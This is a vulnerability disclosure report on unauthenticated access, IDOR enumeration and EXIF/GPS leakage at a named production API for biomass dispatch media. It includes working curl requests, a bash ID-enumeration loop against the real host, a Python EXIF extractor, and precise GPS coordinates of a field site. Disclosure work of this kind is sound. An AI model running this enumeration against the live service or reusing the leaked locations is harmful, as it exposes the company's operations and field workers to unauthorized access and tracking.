# Unauthenticated Media Access & IDOR with EXIF/GPS Data Leakage

**Severity:** Medium (CVSS 3.1: AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N — 5.3)
**Class:** CWE-284 (Improper Access Control), CWE-200 (Exposure of Sensitive Information), CWE-639 (Authorization Bypass Through User-Controlled Key)
**Target:** `charify.varahaag.in` — Kalki API v1.0
**Status:** Confirmed

---

## Summary

The media streaming endpoint at `charify.varahaag.in` requires **no authentication**, allowing any unauthenticated user to access biomass dispatch photos, weighing slips (PDFs), and other operational documents by enumerating sequential integer IDs. Accessed images contain full EXIF metadata including **GPS coordinates**, device information, and timestamps — leaking precise physical locations of biomass collection sites and field operations.

Additionally, the full Swagger/OpenAPI specification is publicly accessible, exposing all 171 API endpoints, and the CORS policy is set to `access-control-allow-origin: *`.

---

## Steps to Reproduce

### Step 1: Discover the API specification

```
GET https://charify.varahaag.in/swagger/doc.json
```

The full Swagger spec is publicly accessible with no authentication. It documents 171 endpoints for the "Kalki API" v1.0 (contact: `app-support@varahaag.com`). The media stream endpoint is explicitly documented as:

> "Stream media files from S3 (no authentication required)"

**Endpoint signature:**
```
GET /api/v1/media/stream/{refId}/{refSubType}/{mediaId}
```

Parameters:
- `refId` — Integer reference ID (dispatch ID)
- `refSubType` — String type identifier (e.g., `BiomassDispatchTruckBack`, `BiomassDispatchWeight`)
- `mediaId` — Sequential integer media file ID

### Step 2: Access media files without authentication

```bash
curl -s "https://charify.varahaag.in/api/v1/media/stream/3624/BiomassDispatchTruckBack/2506387" \
  -o truck_photo.jpg
```

**Response:** HTTP 200, `Content-Type: image/jpeg`, 1,125,918 bytes (1.1 MB)

No authentication headers, cookies, or tokens are required.

### Step 3: Enumerate across different dispatch records (IDOR)

By varying `refId` and `mediaId`, files from **different dispatch operations** are accessible:

| # | refId | refSubType | mediaId | Type | Size |
|---|-------|-----------|---------|------|------|
| 1 | 3624 | BiomassDispatchTruckBack | 2506387 | JPEG (truck photo) | 1.1 MB |
| 2 | 3624 | BiomassDispatchWeight | 2506385 | PDF (weighing slip) | 240 KB |
| 3 | 3617 | BiomassDispatchTruckBack | 2506350 | JPEG (truck photo) | 1.1 MB |
| 4 | 3617 | BiomassDispatchWeight | 2506348 | PDF (weighing slip) | ~240 KB |
| 5 | 3622 | BiomassDispatchTruckBack | 2506370 | JPEG (truck photo) | ~1.1 MB |

These represent **3 different biomass dispatch operations** with photos and documents accessible to anyone.

### Step 4: Extract EXIF/GPS data from images

```bash
python3 -c "
from PIL import Image
from PIL.ExifTags import TAGS, GPSTAGS
img = Image.open('truck_photo.jpg')
exif = img._getexif()
for tag_id, value in exif.items():
    tag = TAGS.get(tag_id, tag_id)
    if tag == 'GPSInfo':
        gps = {GPSTAGS.get(k, k): value[k] for k in value}
        print(f'GPS: {gps}')
    elif tag in ('Make', 'Model', 'DateTime'):
        print(f'{tag}: {value}')
"
```

**EXIF data extracted from mediaId=2506387:**

| Field | Value |
|-------|-------|
| GPS Latitude | 28°28'47.75"N |
| GPS Longitude | 76°54'17.97"E |
| GPS Altitude | 200.7 m above sea level |
| Device Make | OnePlus |
| Device Model | CPH2723 |
| DateTime | 2026:07:07 11:18:24 |
| Camera Pitch | 30.19° |
| Camera Roll | -4.76° |
| Horizontal FOV | 72.46° |
| Vertical FOV | 57.58° |
| GPS Processing | custom_provider |

**EXIF data extracted from mediaId=2506350 (different dispatch):**

| Field | Value |
|-------|-------|
| GPS Latitude | 28°28'47.74"N |
| GPS Longitude | 76°54'17.65"E |
| GPS Altitude | 197.1 m above sea level |
| Device Make | OnePlus |
| Device Model | CPH2723 |
| DateTime | 2026:07:07 10:54:19 |
| Camera Pitch | 30.22° |
| Camera Roll | -5.95° |

Both images geolocate to a specific site in **Haryana, India** — a biomass collection/processing facility.

### Step 5: Verify CORS misconfiguration

```bash
curl -s "https://charify.varahaag.in/api/v1/media/stream/3624/BiomassDispatchTruckBack/2506387" \
  -H "Origin: https://evil.com" -I
```

**Response headers:**
```
access-control-allow-origin: *
access-control-allow-methods: GET, OPTIONS, HEAD, PUT, PATCH, POST, DELETE
access-control-allow-headers: *
```

Any website can programmatically fetch these files via JavaScript — no CORS restrictions.

---

## Proof of Concept

### Request (no authentication):

```http
GET /api/v1/media/stream/3624/BiomassDispatchTruckBack/2506387 HTTP/2
Host: charify.varahaag.in
Accept: */*
```

### Response:

```
HTTP/2 200
content-type: image/jpeg
access-control-allow-origin: *

[1,125,918 bytes of JPEG image data with embedded EXIF/GPS]
```

### Enumeration script:

```bash
for refId in $(seq 3610 3630); do
  for subType in BiomassDispatchTruckBack BiomassDispatchWeight; do
    for mediaId in $(seq 2506340 2506400); do
      CODE=$(curl -s -o /dev/null -w "%{http_code}" \
        "https://charify.varahaag.in/api/v1/media/stream/$refId/$subType/$mediaId")
      [ "$CODE" = "200" ] && echo "FOUND: refId=$refId/$subType/mediaId=$mediaId"
    done
  done
done
```

### Swagger specification (publicly accessible):

```
GET https://charify.varahaag.in/swagger/doc.json
```

Returns full API specification: 171 endpoints, data models, parameter schemas.

---

## Attack Flow

```
  Attacker (unauthenticated)
         │
         ▼
  GET /swagger/doc.json ──────────────► Full API spec (171 endpoints)
         │                               Media stream endpoint documented
         │                               as "no authentication required"
         ▼
  GET /api/v1/media/stream/
      {refId}/{refSubType}/{mediaId}
         │
         ├─► Enumerate refId (3617, 3622, 3624...)
         ├─► Enumerate refSubType (TruckBack, Weight...)
         └─► Enumerate mediaId (2506348-2506387...)
              │
              ▼
     ┌─── 200 OK ───┐
     │               │
     ▼               ▼
   JPEG           PDF
   Photos         Documents
     │               │
     ▼               │
  EXIF Extract       │
     │               │
     ├─► GPS coords (28.479°N, 76.905°E)
     ├─► Device info (OnePlus CPH2723)
     ├─► Timestamps (2026-07-07)
     ├─► Camera FOV/pitch/roll
     └─► Altitude (197-200m)
```

---

## Impact

1. **Location disclosure**: GPS coordinates in EXIF data reveal the exact physical location of biomass collection sites and field operations. An attacker could map all operational sites.

2. **Operational intelligence**: Truck photos, weighing slips, and dispatch records expose logistics and supply chain operations — quantities, vehicle registrations, driver details (via the `BiomassDispatchWithMedia` schema shows `driver_name`, `driver_phone_number`, `vehicle_no`).

3. **Device fingerprinting**: EXIF metadata reveals the exact device model (OnePlus CPH2723) and software used by field agents, enabling targeted social engineering.

4. **Scalable enumeration**: Sequential integer IDs (both `refId` and `mediaId`) make automated mass scraping trivial. The Swagger spec provides a roadmap for the attacker.

5. **Cross-origin exploitation**: The `access-control-allow-origin: *` CORS policy allows any malicious website to programmatically fetch and exfiltrate media files via JavaScript, without user interaction.

6. **Business data exposure**: PDF weighing slips contain business operational data (weights, facility details) that should be confidential.

---

## Remediation

### Immediate (P0):
1. **Add authentication to the media stream endpoint** — Require a valid JWT/session token. The endpoint is the only one of 171 that requires no auth; this appears to be an oversight.
2. **Strip EXIF metadata from served images** — Use server-side processing (e.g., `ExifTool -all=`) to remove GPS, device, and camera metadata before streaming files to clients.

### Short-term (P1):
3. **Implement authorization checks** — Verify the requesting user has access to the specific `refId` (dispatch record) before serving its media.
4. **Use non-sequential, unpredictable IDs** — Replace integer `mediaId` and `refId` with UUIDs to prevent enumeration.
5. **Restrict CORS** — Replace `access-control-allow-origin: *` with an allowlist of trusted origins.
6. **Remove or protect Swagger docs** — Move `/swagger/doc.json` behind authentication, or restrict to internal networks only. At minimum, remove it from production.

### Long-term (P2):
7. **Use signed/expiring URLs for S3 media** — Generate time-limited pre-signed S3 URLs rather than proxying through a public endpoint.
8. **Rate-limit the endpoint** — Add rate limiting to prevent mass enumeration even if authentication is bypassed.

---

## Confirmed Accessible Files

| refId | refSubType | mediaId | File Type | Leaked Data |
|-------|-----------|---------|-----------|-------------|
| 3624 | BiomassDispatchTruckBack | 2506387 | JPEG 1.1MB | GPS, device, timestamp, camera angles |
| 3624 | BiomassDispatchWeight | 2506385 | PDF 240KB | Weighing slip (business document) |
| 3617 | BiomassDispatchTruckBack | 2506350 | JPEG 1.1MB | GPS, device, timestamp, camera angles |
| 3617 | BiomassDispatchWeight | 2506348 | PDF ~240KB | Weighing slip (business document) |
| 3622 | BiomassDispatchTruckBack | 2506370 | JPEG ~1.1MB | GPS, device, timestamp, camera angles |

---

## References

- CWE-284: Improper Access Control — https://cwe.mitre.org/data/definitions/284.html
- CWE-200: Exposure of Sensitive Information — https://cwe.mitre.org/data/definitions/200.html
- CWE-639: Authorization Bypass Through User-Controlled Key (IDOR) — https://cwe.mitre.org/data/definitions/639.html
- OWASP API1:2023 — Broken Object Level Authorization
- OWASP API5:2023 — Broken Function Level Authorization
- OWASP API9:2023 — Improper Inventory Management (Swagger exposure)
